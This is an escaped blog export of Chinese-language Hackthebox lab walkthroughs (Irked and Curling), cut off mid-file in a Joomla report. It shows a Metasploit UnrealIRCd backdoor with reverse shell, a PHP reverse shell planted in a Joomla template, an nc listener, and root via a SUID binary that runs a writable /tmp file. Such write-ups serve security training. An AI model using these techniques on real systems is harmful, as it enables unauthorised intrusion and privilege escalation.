æ¼æ´åˆ©ç”¨\n```bash\nmsf6 > search Unreal\n\nMatching Modules\n================\n\n   #  Name                                        Disclosure Date  Rank       Check  Description\n   -  ----                                        ---------------  ----       -----  -----------\n   0  exploit/linux/games/ut2004_secure           2004-06-18       good       Yes    Unreal Tournament 2004 \"secure\" Overflow (Linux)\n   1  exploit/windows/games/ut2004_secure         2004-06-18       good       Yes    Unreal Tournament 2004 \"secure\" Overflow (Win32)\n   2  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution\n\nInteract with a module by name or index. For example info 2, use 2 or use exploit/unix/irc/unreal_ircd_3281_backdoor\n```\nä½¿ç”¨ msf æœåˆ°äº†ä¸€ä¸ªè„šæœ¬ï¼Œå»ä½¿ç”¨ä¸€ä¸‹\n\n```bash\nmsf6 > use 2\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options \n\nModule options (exploit/unix/irc/unreal_ircd_3281_backdoor):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n   RPORT   6667             yes       The target port (TCP)\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Target\n```\nè®¾ç½®å¥½ RHOSTSï¼Œç„¶åæ‰§è¡Œ\n\n```bash\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse\npayload => cmd/unix/reverse\n\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 10.10.10.117\nrhosts => 10.10.10.117\n\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set lhost 10.10.16.12\nlhost => 10.10.16.12\n\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rport 6697\nrport => 6697\n```\n```bash\nmsf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit \n\n[*] Started reverse TCP double handler on 10.10.16.12:4444 \n[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...\n    :irked.htb NOTICE AUTH :*** Looking up your hostname...\n[*] 10.10.10.117:6697 - Sending backdoor command...\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo SUUjSBbQaAoSC5R9;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: \"SUUjSBbQaAoSC5R9\\r\\n\"\n[*] Matching...\n[*] A is input...\n[*] Command shell session 1 opened (10.10.16.12:4444 -> 10.10.10.117:51640) at 2022-04-28 22:55:02 -0400\n\nwhoami&&id\nircd\nuid=1001(ircd) gid=1001(ircd) groups=1001(ircd)\n```\næ¥ç€ä½¿ç”¨ shell è¿›å…¥ shell æ¨¡å¼\n\n```bash\nshell\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n```bash\nircd@irked:/home/djmardov/Documents$ ls -la\nls -la\ntotal 16\ndrwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .\ndrwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..\n-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup\n-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt\n```\næœ‰ç‚¹å¥‡æ€ªï¼Œæ˜æ˜æ˜¯ Linux ç³»ç»Ÿï¼Œdjmardov ç”¨æˆ·ç›®å½•å´æ˜¯ Windows çš„ç³»ç»Ÿç»“æ„\n\nåœ¨ç›®å½• /home/djmardov/Documents ä¸­æ‰¾åˆ°äº† user.txt flag æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬æƒé™ä¸å¤Ÿï¼Œè¿˜æœ‰ä¸€ä¸ª .backup æ–‡ä»¶ï¼Œæˆ‘ä»¬æœ‰æŸ¥çœ‹æƒé™ï¼Œçœ‹ä¸€ä¸‹æ˜¯ä»€ä¹ˆ\n\n# æƒé™æå‡\n## User\n```bash\nircd@irked:/home/djmardov/Documents$ cat .backup\ncat .backup\nSuper elite steg backup pw\nUPupDOWNdownLRlrBAbaSSss\n```\næˆ‘ç›´æ¥æ‹¿ç€è¿™æ®µå¯†ç å»ç™»å½• djmardov è´¦æˆ·æ˜¯ä¸è¡Œçš„ï¼Œæç¤ºå¤±è´¥\n\nç„¶åçœ‹ç€æç¤ºï¼Œè¿™ä¼¼ä¹æ˜¯ä¸€æ®µ steg çš„ç¼–ç ï¼Œè€Œæˆ‘ä»¬åˆæ²¡æœ‰è¦è§£å¯†çš„æ–‡ä»¶ï¼Œè¿™æ—¶å€™æˆ‘æƒ³èµ·æ¥ï¼Œå¯†ç ä¸€èˆ¬ä¼šè—åœ¨å“ªï¼Ÿå½“ç„¶æ˜¯å›¾ç‰‡é‡Œï¼Œè€Œå“ªé‡Œæœ‰å›¾ç‰‡å‘¢ï¼ŸHTTP æœåŠ¡çš„ä¸»é¡µæœ‰ä¸€å¼ å›¾ç‰‡ï¼\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# steghide extract -sf irked.jpg                                            1 â¨¯\nEnter passphrase: \nwrote extracted data to \"pass.txt\".\n```\nåœ¨è¿™æç¤ºæˆ‘ä»¬è¾“å…¥å¯†ç ï¼Œåˆšæ‰ .backup é‡Œçš„å¯†ç å°±æœ‰ç”¨å¤„äº†ï¼Œè¾“å…¥å¯†ç åè§£å‹å‡ºæ¥ä¸€ä¸ª pass.txt æ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat pass.txt    \nKab6h+m+bbp2J:HG\n```\nå¾—åˆ°äº†å¯†ç \n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh djmardov@10.10.10.117     \ndjmardov@10.10.10.117's password: \n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Thu Apr 28 04:38:52 2022 from 10.10.14.3\ndjmardov@irked:~$ whoami&&id\ndjmardov\nuid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)\n```\næˆåŠŸææƒåˆ° user ç”¨æˆ·\n\n```bash\ndjmardov@irked:~/Documents$ cat user.txt \n4a66a78b12dc0e661a59d3f5c0267a8e\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\ndjmardov@irked:~$ find / -user root -perm -4000 -print 2>/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/openssh/ssh-keysign\n/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper\n/usr/sbin/exim4\n/usr/sbin/pppd\n/usr/bin/chsh\n/usr/bin/procmail\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/pkexec\n/usr/bin/X\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/viewuser\n/sbin/mount.nfs\n/bin/su\n/bin/mount\n/bin/fusermount\n/bin/ntfs-3g\n/bin/umount\n```\nä½¿ç”¨ find æŸ¥æ‰¾ä¸€ä¸‹ç‰¹æ®Šæƒé™æ–‡ä»¶\n\næ‰¾åˆ°äº†ä¸€ä¸ª /usr/bin/viewuser æ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\ndjmardov@irked:/usr/bin$ ./viewuser \nThis application is being devleoped to set and test user permissions\nIt is still being actively developed\n(unknown) :0           2022-04-28 02:46 (:0)\ndjmardov pts/5        2022-04-28 23:22 (10.10.16.12)\n/tmp/listusers: connect: Connection refused\n```\nå‘ç°è¿™é‡Œä¼¼ä¹è°ƒç”¨äº†ä¸€ä¸ª /tmp/listusers\n\nå‘ /tmp/listusers å†™å…¥æ–‡ä»¶\n\n```bash\necho \"/bin/sh\" > /tmp/listusers\n```\næ¥ç€æ‰§è¡Œ /usr/bin/viewuser\n\n```bash\ndjmardov@irked:/tmp$ echo \"/bin/sh\" > /tmp/listusers\ndjmardov@irked:/tmp$ /usr/bin/viewuser\nThis application is being devleoped to set and test user permissions\nIt is still being actively developed\n(unknown) :0           2022-04-28 02:46 (:0)\ndjmardov pts/5        2022-04-28 23:52 (10.10.16.12)\n# whoami&&id\nroot\nuid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\n# cat /root/root.txt\n8d8e9e8be64654b6dccc3bff4522daf3\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Curling - Hackthebox","url":"/2022/04/28/Hackthebox/Easy/Hackthebox-Curling/","content":"\n# Hackthebox - Curling\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Curling/66a7ee16-791a-4bbc-88e7-954dbf76d46b.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Curling/4d877af9-efa7-4e5b-b060-447dfdc01db7.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.150\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-26 21:40 EDT\nNmap scan report for 10.10.10.150\nHost is up (0.34s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-generator: Joomla! - Open Source Content Management\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Home\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/26%OT=22%CT=1%CU=41478%PV=Y%DS=2%DC=T%G=Y%TM=62689FB\nOS:F%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=2%ISR=10B%TI=Z%CI=Z%II=I%TS=C)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3389/tcp)\nHOP RTT       ADDRESS\n1   338.76 ms 10.10.14.1\n2   339.30 ms 10.10.10.150\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 175.76 seconds\n```\n## HTTP\n![](Hackthebox-Curling/f5db0f7f-b519-4b90-88d6-e479da0d17be.png)\n\nè¿™ä¸€å°ä¼¼ä¹æ˜¯å…³äºå†°å£¶çš„ï¼Œåˆ°å¤„çœ‹äº†ä¸€ä¸‹ï¼Œæ²¡çœ‹åˆ°ä»€ä¹ˆçªç ´å£ï¼Œå¼±å£ä»¤ä¹Ÿæ²¡æœ‰ç™»å…¥è¿›å»ï¼Œå» Fuzz ä¸€ä¸‹\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# gobuster dir -u http://10.10.10.150/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error                                                                                  1 â¨¯\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.150/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/27 01:33:22 Starting gobuster in directory enumeration mode\n===============================================================\n/media                (Status: 301) [Size: 312] [--> http://10.10.10.150/media/]\n/templates            (Status: 301) [Size: 316] [--> http://10.10.10.150/templates/]\n/images               (Status: 301) [Size: 313] [--> http://10.10.10.150/images/]   \n/modules              (Status: 301) [Size: 314] [--> http://10.10.10.150/modules/]  \n/bin                  (Status: 301) [Size: 310] [--> http://10.10.10.150/bin/]      \n/plugins              (Status: 301) [Size: 314] [--> http://10.10.10.150/plugins/]  \n/includes             (Status: 301) [Size: 315] [--> http://10.10.10.150/includes/] \n/language             (Status: 301) [Size: 315] [--> http://10.10.10.150/language/] \n/components           (Status: 301) [Size: 317] [--> http://10.10.10.150/components/]\n/libraries            (Status: 301) [Size: 316] [--> http://10.10.10.150/libraries/] \n/cache                (Status: 301) [Size: 312] [--> http://10.10.10.150/cache/]     \n/tmp                  (Status: 301) [Size: 310] [--> http://10.10.10.150/tmp/]       \n/layouts              (Status: 301) [Size: 314] [--> http://10.10.10.150/layouts/]   \n/administrator        (Status: 301) [Size: 320] [--> http://10.10.10.150/administrator/]\n/cli                  (Status: 301) [Size: 310] [--> http://10.10.10.150/cli/]          \n/server-status        (Status: 403) [Size: 277]                                         \n\n===============================================================                                                                                                                                                    \n2022/04/27 01:59:29 Finished\n===============================================================\n```\næŒ¨ä¸ªå»çœ‹ä¸€ä¸‹\n\n![](Hackthebox-Curling/7827e73d-2e33-4950-842c-d51e6d5c613a.png)\n\nåœ¨ /administrator ç›®å½•ä¸‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ª Joomlaï¼Œä½†æ˜¯ä¸çŸ¥é“ç‰ˆæœ¬ï¼Œæœç´¢äº†ä¸€ä¸‹ Joomla ä¹Ÿæ²¡æœ‰é»˜è®¤å¯†ç ï¼Œç»§ç»­çœ‹çœ‹\n\n```bash\n</body>\n      <!-- secret.txt -->\n</html>\n```\nåœ¨é¦–é¡µçš„æºä»£ç æœ€ä¸‹é¢çš„ 359 è¡Œå‘ç°äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nQ3VybGluZzIwMTgh\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# echo Q3VybGluZzIwMTgh|base64 -d            \nCurling2018!\n```\næˆ‘çŒœæƒ³è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå¯†ç \n\n![](Hackthebox-Curling/b4a6e7e3-eea7-4d48-bccd-66c1ab4a19dc.png)\n\nç„¶ååœ¨é¦–é¡µé¢è·å–åˆ°ä¸€ä¸ªè´¦å·\n\n```bash\nusername = Floris\npassword = Curling2018!\n```\n![](Hackthebox-Curling/10d7687a-048c-47c8-b76c-988b5916a186.png)\n\nç™»å½•æˆåŠŸï¼Œä½†è¿™é‡Œä¼¼ä¹æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæˆ‘ä»¬å°è¯•å» Joomla ç™»å½•è¯•è¯•\n\n![](Hackthebox-Curling/efa895dc-539b-4cfb-8fc0-edc26ce8d39b.png)\n\nç™»å½•æˆåŠŸï¼Œä¸œè¥¿æ¯”è¾ƒå¤šï¼Œåˆ°å¤„æ‰¾æ‰¾æœ‰æ²¡æœ‰çªç ´å£\n\n# æ¼æ´åˆ©ç”¨\n![](Hackthebox-Curling/c3a80c56-185b-4f9b-8407-1f30288e0599.png)\n\né€‰æ‹©é¦–é¡µé¢çš„ Global â†’ Media â†’ Legal Extensions (File Types)\n\nç„¶åæ·»åŠ ä¸Šæˆ‘ä»¬è¦çš„åç¼€ php\n\nä¿®æ”¹å¥½ä»¥åç‚¹å‡» Save&close\n\næ¥ç€ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\nç„¶åè®¿é—® Extensions â†’ Templates â†’ Templates â†’ Beez3 Details and Files\n\næ¥ç€æ·»åŠ ä¸€ä¸ªæ–°æ–‡ä»¶\n\n![](Hackthebox-Curling/8560ce82-6f92-470a-930d-4779a6607b05.png)\n\n> [https://github.com/LucifielHack/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/LucifielHack/php-reverse-shell/blob/master/php-reverse-shell.php)\n\næŠŠæˆ‘ä»¬çš„ reverse-shell.php ç»™ä¼ ä¸Šå»\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# curl http://10.10.10.150/templates/beez3/shell.php\n```\næ¥ç€è¯·æ±‚ä¸€ä¸‹æˆ‘ä»¬çš„ shell\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                       \nlistening on [any] 4444 ...\nconnect to [10.10.16.12] from (UNKNOWN) [10.10.10.150] 40030\nLinux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\n 06:24:26 up 31 min,  0 users,  load average: 0.06, 0.01, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (1262): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@curling:/$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell\n\næ¥ç€ä¿®å¤ä¸€ä¸‹shell\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\nCtrl+Z\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\n# æƒé™æå‡\n## User\n```bash\nwww-data@curling:/home$ ls\nfloris\nwww-data@curling:/home$ cd floris\nwww-data@curling:/home/floris$ ls\nadmin-area  password_backup  user.txt\n```\nåœ¨ /home/floris ä¸­å‘ç°äº†ä¸€ä¸ªç›®å½• admin-area ä¸€ä¸ªæ–‡ä»¶ password\\_backup\n\nå…¶ä¸­ç›®å½•æˆ‘ä»¬æ²¡æƒé™è®¿é—®ï¼Œä½†æ–‡ä»¶æˆ‘ä»¬æœ‰æƒé™è®¿é—®\n\n```bash\nwww-data@curling:/home/floris$ cat password_backup \n00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..\n00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4\n00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`\n00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......\n00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..\n00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4\n00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..\n00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x\n00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1\n00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s.\"\n000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.\n000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..\n000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C\n000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..\n000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.\n000000f0: 819b bb48                                ...H\n```\næŸ¥çœ‹åå‘ç°æ˜¯ä¹±ç ï¼Œä½¿ç”¨ xxd æŸ¥çœ‹å¹¶ä¿å­˜åˆ°æ–‡ä»¶\n\n```bash\nwww-data@curling:/home/floris$ xxd -r password_backup > /tmp/backup\n```\n```bash\nwww-data@curling:/home/floris$ cd /tmp\nwww-data@curling:/tmp$ file backup \nbackup: bzip2 compressed data, block size = 900k\n```\næŸ¥çœ‹æ–‡ä»¶ç±»å‹å‘ç°æ˜¯ä¸€ä¸ª bzip2 çš„ç±»å‹\n\n```bash\nwww-data@curling:/tmp$ mv backup backup.bz2\nwww-data@curling:/tmp$ bzip2 -d backup.bz2 \nwww-data@curling:/tmp$ ls\nbackup\n```\nå’±ä»¬æŠŠè¿™ä¸ªæ–‡ä»¶è§£å‹å‡ºæ¥ï¼Œç„¶åå†å»çœ‹çœ‹\n\n```bash\nwww-data@curling:/tmp$ ls\nbackup\nwww-data@curling:/tmp$ file backup \nbackup: gzip compressed data, was \"password\", last modified: Tue May 22 19:16:20 2018, from Unix\n```\nè§£å‹å‡ºæ¥åå‘ç°æ˜¯ä¸ª gzip æ–‡ä»¶ï¼Œè¿˜å¾—è§£å‹ä¸€æ¬¡\n\n```bash\nwww-data@curling:/tmp$ mv backup backup.gz\nwww-data@curling:/tmp$ tar xvf backup.gz\n```\n```bash\nwww-data@curling:/tmp$ ls\nbackup.out\nwww-data@curling:/tmp$ file backup.out \nbackup.out: POSIX tar archive (GNU)\n```\nåæ­£è¿™é‡Œå¾—è§£å‹å¥½å‡ æ¬¡ï¼Œç»™æˆ‘å¼„çš„æœ‰ç‚¹æ™•ï¼Œè¿˜ä»¥ä¸ºæ˜¯åœ¨æ— é™å¾ªç¯å‘¢\n\n```bash\nwww-data@curling:/tmp$ mv backup.out backup.tar\nwww-data@curling:/tmp$ tar xvf backup.tar \npassword.txt\n```\næ€»ç®—è§£å‹å®Œäº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶\n\n```bash\nwww-data@curling:/tmp$ cat password.txt \n5d<wdCbdZu)|hChXll\n```\næ„Ÿè§‰è¿™æ˜¯ç”¨æˆ· floris çš„å¯†ç äº†ï¼Œå»ç™»å½• ssh è¯•è¯•\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh floris@10.10.10.150       \nThe authenticity of host '10.10.10.150 (10.10.10.150)' can't be established.\nECDSA key fingerprint is SHA256:o1Cqn+GlxiPRiKhany4ZMStLp3t9ePE9GjscsUsEjWM.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.150' (ECDSA) to the list of known hosts.\nfloris@10.10.10.150's password: \nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Thu Apr 28 06:53:07 UTC 2022\n\n  System load:  0.0               Processes:            172\n  Usage of /:   49.2% of 9.78GB   Users logged in:      0\n  Memory usage: 25%               IP address for ens33: 10.10.10.150\n  Swap usage:   0%\n\n0 updates can be applied immediately.\n\nLast login: Wed Sep  8 11:42:07 2021 from 10.10.14.15\nfloris@curling:~$ whoami&&id\nfloris\nuid=1000(floris) gid=1004(floris) groups=1004(floris)\n```\næˆåŠŸææƒåˆ° user æƒé™ç”¨æˆ·\n\n```bash\nfloris@curling:~$ cat user.txt \n65dd1df0713b40d88ead98cf11b8530b\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶\n\n## Root\n```bash\nfloris@curling:~$ sudo -l\n[sudo] password for floris: \nSorry, user floris may not run sudo on curling.\n```\nsudo -l æ²¡æœ‰ä¸œè¥¿ï¼Œå’±ä»¬è¿˜æ˜¯ç€çœ¼äº admin-area ç›®å½•å§\n\n```bash\nfloris@curling:~/admin-area$ ls -la\ntotal 28\ndrwxr-x--- 2 root   floris  4096 May 22  2018 .\ndrwxr-xr-x 6 floris floris  4096 May 22  2018 ..\n-rw-rw---- 1 root   floris    25 Apr 28 06:55 input\n-rw-rw---- 1 root   floris 14236 Apr 28 06:55 report\n```\nè¿™è¾¹æ˜¯æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”å’±ä»¬æœ‰æŸ¥çœ‹å’Œå†™å…¥æƒé™\n\n```bash\nfloris@curling:~/admin-area$ cat input \nurl = \"http://127.0.0.1\"\n```\n```bash\nfloris@curling:~/admin-area$ cat report \n<!DOCTYPE html>\n<html lang=\"en-gb\" dir=\"ltr\">\n<head>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <meta charset=\"utf-8\" />\n        <base href=\"http://127.0.0.1/\" />\n        <meta name=\"description\" content=\"best curling site on the planet!\" />\n        <meta name=\"generator\" content=\"Joomla! - Open Source Content Management\" />\n        <title>Home</title>\n        <link href=\"/index.php?format=feed&type=rss\" rel=\"alternate\" type=\"application/rss+xml\" title=\"RSS 2.0\" />\n        <link href=\"/index.php?format=feed&type=atom\" rel=\"alternate\" type=\"application/atom+xml\" title=\"Atom 1.0\" />\n        <link href=\"/templates/protostar/favicon.ico\" rel=\"shortcut icon\" type=\"image/vnd.microsoft.icon\" />\n        <link href=\"/templates/protostar/css/template.css?b6bf078482bc6a711b54fa9e74e19603\" rel=\"stylesheet\" />\n        <link href=\"https://fonts.googleapis.com/css?family=Open+Sans\" rel=\"stylesheet\" />\n        <style>\n\n        h1, h2, h3, h4, h5, h6, .site-title {\n                font-family: 'Open Sans', sans-serif;\n        }\n        </style>\n        <script type=\"application/json\" class=\"joomla-script-options new\">{\"csrf.token\":\"e6b8a82d84a03e7e05d6452f52f975f7\",\"system.paths\":{\"root\":\"\",\"base\":\"\"},\"system.keepalive\":{\"interval\":840000,\"uri\":\"\\/index.php\\/component\\/ajax\\/?format=json\"}}</script>\n        <script src=\"/media/jui/js/jquery.min.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script src=\"/media/jui/js/jquery-noconflict.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script src=\"/media/jui/js/jquery-migrate.min.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script src=\"/media/system/js/caption.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script src=\"/media/jui/js/bootstrap.min.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script src=\"/templates/protostar/js/template.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <!--[if lt IE 9]><script src=\"/media/jui/js/html5.js?b6bf078482bc6a711b54fa9e74e19603\"></script><![endif]-->\n        <script src=\"/media/system/js/core.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <!--[if lt IE 9]><script src=\"/media/system/js/polyfill.event.js?b6bf078482bc6a711b54fa9e74e19603\"></script><![endif]-->\n        <script src=\"/media/system/js/keepalive.js?b6bf078482bc6a711b54fa9e74e19603\"></script>\n        <script>\njQuery(window).on('load',  function() {\n                                new JCaption('img.caption');\njQuery(function($){ initTooltips(); $(\"body\").on(\"subform-row-add\", initTooltips); function initTooltips (event, container) { container = container || document;$(container).find(\".hasTooltip\").tooltip({\"html\": true,\"container\": \"body\"});} });\n        </script>\n\n</head>\n<body class=\"site com_content view-featured no-layout no-task itemid-101\">\n        <!-- Body -->\n        <div class=\"body\" id=\"top\">\n                <div class=\"container\">\n                        <!-- Header -->\n                        <header class=\"header\" role=\"banner\">\n                                <div class=\"header-inner clearfix\">\n                                        <a class=\"brand pull-left\" href=\"/\">\n                                                <span class=\"site-title\" title=\"Cewl Curling site!\">Cewl Curling site!</span>                                                                                   </a>\n                                        <div class=\"header-search pull-right\">\n\n                                        </div>\n                                </div>\n                        </header>\n\n                        <div class=\"row-fluid\">\n                                                                <main id=\"content\" role=\"main\" class=\"span9\">\n                                        <!-- Begin Content -->\n\n                                        <div id=\"system-message-container\">\n        </div>\n\n                                        <div class=\"blog-featured\" itemscope itemtype=\"https://schema.org/Blog\">\n<div class=\"page-header\">\n        <h1>\n        Home    </h1>\n</div>\n\n<div class=\"items-leading clearfix\">\n                        <div class=\"leading-0 clearfix\"\n                        itemprop=\"blogPost\" itemscope itemtype=\"https://schema.org/BlogPosting\">\n\n        <h2 class=\"item-title\" itemprop=\"headline\">\n                        <a href=\"/index.php/2-uncategorised/3-what-s-the-object-of-curling\" itemprop=\"url\">\n                        What's the object of curling?           </a>\n                </h2>\n\n<div class=\"icons\">\n\n                                        <div class=\"btn-group pull-right\">\n                                <button class=\"btn dropdown-toggle\" type=\"button\" id=\"dropdownMenuButton-3\" aria-label=\"User tools\"\n                                